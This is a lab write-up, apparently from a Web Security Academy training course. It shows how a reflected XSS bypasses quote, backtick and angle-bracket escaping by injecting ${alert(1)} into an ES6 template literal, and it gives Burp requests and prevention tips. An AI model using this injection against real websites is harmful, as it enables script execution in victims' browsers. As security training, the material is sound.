# Lab 21: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**Goal**: Execute an `alert()` function inside an ES6 JavaScript template literal (`${...}`) when quotes, angle brackets, backslashes, and backticks are escaped or HTML-encoded.

This lab contains a reflected cross-site scripting vulnerability in the search functionality. User input is reflected inside an ES6 JavaScript template literal delimited by backticks (`` `...` ``). Even though quotes, backticks, and angle brackets are escaped or encoded, ES6 template literals support **Expression Interpolation** using `${...}` syntax without requiring quotes or backticks!

---

## 🎯 Solution

1. Test input reflection in Burp Suite Repeater:
   ```javascript
   var message = `Search results for 'test123'`;
   ```
2. Inject ES6 template literal expression syntax:
   ```html
   ${alert(1)}
   ```
3. Load the URL in the browser to execute `alert(1)` automatically.

![Lab 21 Template Literal Payload](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20185338.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Reflection Context
Submit a search query (e.g., `test123`) in the search box. Intercept the request in Burp Suite Proxy and send it to **Repeater**:

```http
GET /?search=test123 HTTP/2
Host: your-lab-id.web-security-academy.net
```

Inspect the response body:

```javascript
<script>
    var message = `Search results for 'test123'`;
</script>
```

- Angle brackets `<` and `>` are HTML-encoded (`&lt;`, `&gt;`).
- Single quotes `'`, double quotes `"`, and backticks `` ` `` are Unicode-escaped (`\u0027`, `\u0022`, `\u0060`).

### Step 2: Leverage ES6 Template Interpolation Syntax
ES6 template literals (delimited by backticks) feature native expression evaluation: `${ expression }`.

Inside `${ ... }`, any valid JavaScript expression is evaluated dynamically by the browser engine **without needing backticks, single quotes, or closing quotes**!

### Step 3: Inject Payload
Inject the expression payload directly into the search parameter:

```http
/?search=${alert(1)}
```

When reflected into the inline script, the code expands to:

```javascript
<script>
    var message = `Search results for '${alert(1)}'`;
</script>
```

### Step 4: Verify Payload Execution
Load the URL in the browser:

```http
https://<YOUR-LAB-ID>.web-security-academy.net/?search=${alert(1)}
```

As the browser parses the script, the JS engine evaluates `${alert(1)}` during template string interpolation and triggers `alert(1)`:

![Lab 21 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20185413.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` via ES6 template literal `${alert(1)}` interpolation!

---

## 💡 Key Takeaways: ES6 Template Literal Exploitation

- **Native Interpolation**: ES6 backtick template strings (`` `...` ``) evaluate JavaScript expressions inside `${ ... }` natively.
- **Bypassing Escaping Filters**: Because `${ ... }` requires no quote delimiters or closing backticks, sanitizers that only filter quotes/backticks remain vulnerable to ES6 expression injection.

---

## 🔒 Prevention

> [!TIP]
> 1. **Sanitize `${` Sequences**: When reflecting user input inside template strings, escape `$` characters (`\$`) or disallow `${` token sequences.
> 2. **JSON Serialization**: Use `JSON.stringify()` or standard single/double quoted strings with proper Unicode escaping instead of backtick template literals.
